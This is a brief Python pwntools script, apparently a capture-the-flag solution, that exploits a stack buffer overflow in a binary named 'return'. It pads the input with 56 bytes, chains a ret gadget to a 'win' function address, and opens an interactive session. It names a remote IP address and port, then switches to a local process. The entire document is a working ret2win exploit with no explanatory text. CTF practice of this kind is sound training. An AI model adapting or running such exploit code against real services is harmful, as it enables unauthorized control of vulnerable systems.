from pwn import *

ip = "140.110.112.77"
port = 2118

r = remote(ip, port)
r = process("./return")

context.arch = "amd64"

ret = 0x400539
win = 0x4006B6

payload = b""
payload += flat("a" * 56, ret, win)

r.sendlineafter(")", payload)

r.interactive()
